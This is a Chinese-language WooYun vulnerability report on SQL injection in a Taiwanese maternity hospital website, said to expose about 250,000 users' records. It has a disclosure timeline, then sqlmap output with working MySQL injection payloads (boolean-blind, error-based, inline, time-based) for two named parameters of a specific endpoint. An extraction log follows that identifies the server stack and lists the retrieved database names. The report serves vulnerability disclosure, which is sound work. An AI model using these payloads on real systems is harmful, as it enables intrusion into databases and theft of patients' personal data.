wybug_title: 宏其婦幼醫院SQL注射涉及25万用户信息（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-14：	细节已通知厂商并且等待厂商处理中									2015-12-15：	厂商已经确认，细节仅向厂商公开									2015-12-25：	细节向核心白帽子及相关领域专家公开									2016-01-04：	细节向普通白帽子公开									2016-01-14：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述： 宏其婦幼醫院sql注射 详细说明：  宏其婦幼醫院sql注射链接：http://**.**.**.**/album/albumBefAction?doit=show&mbr_no=331161&no=307044参数：Parameter: mbr_no (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: doit=show&mbr_no=331161 RLIKE (SELECT (CASE WHEN (4425=4425) THEN 331161 ELSE 0x28 END))&no=307044   漏洞证明：  Parameter: no (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: doit=show&mbr_no=331161&no=-5948' OR 7908=7908#    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: doit=show&mbr_no=331161&no=-3640' OR 1 GROUP BY CONCAT(0x716b707671,(SELECT (CASE WHEN (9133=9133) THEN 1 ELSE 0 END)),0x716b717171,FLOOR(RAND(0)*2)) HAVING MIN(0)#    Type: inline query    Title: MySQL inline queries    Payload: doit=show&mbr_no=331161&no=(SELECT CONCAT(0x716b707671,(SELECT (ELT(2887=2887,1))),0x716b717171))    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: doit=show&mbr_no=331161&no=307044' AND (SELECT * FROM (SELECT(SLEEP(5)))eKvS)#Parameter: mbr_no (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: doit=show&mbr_no=331161 RLIKE (SELECT (CASE WHEN (4425=4425) THEN 331161 ELSE 0x28 END))&no=307044    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: doit=show&mbr_no=331161 AND (SELECT 4910 FROM(SELECT COUNT(*),CONCAT(0x716b707671,(SELECT (ELT(4910=4910,1))),0x716b717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&no=307044    Type: inline query    Title: MySQL inline queries    Payload: doit=show&mbr_no=(SELECT CONCAT(0x716b707671,(SELECT (ELT(6656=6656,1))),0x716b717171))&no=307044    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: doit=show&mbr_no=331161 AND (SELECT * FROM (SELECT(SLEEP(5)))Wpec)&no=307044---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: mbr_no, type: Unescaped numeric (default)[1] place: GET, parameter: no, type: Single quoted string[q] Quit> 0[15:54:33] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Fedora 3 (Heidelberg)web application technology: Apache 2.0.52, JSPback-end DBMS: MySQL 5.0.12[15:54:33] [INFO] fetching database names[15:54:37] [INFO] the SQL query used returns 8 entries[15:54:38] [INFO] retrieved: information_schema[15:54:38] [INFO] retrieved: mysql[15:54:39] [INFO] retrieved: old_women2[15:54:39] [INFO] retrieved: test[15:54:40] [INFO] retrieved: women[15:54:42] [INFO] retrieved: women_bak971018[15:54:42] [INFO] retrieved: women_bak_catgory[15:54:43] [INFO] retrieved: women_testavailable databases [8]:[*] information_schema[*] mysql[*] old_women2[*] test[*] women[*] women_bak971018[*] women_bak_catgory[*] women_test
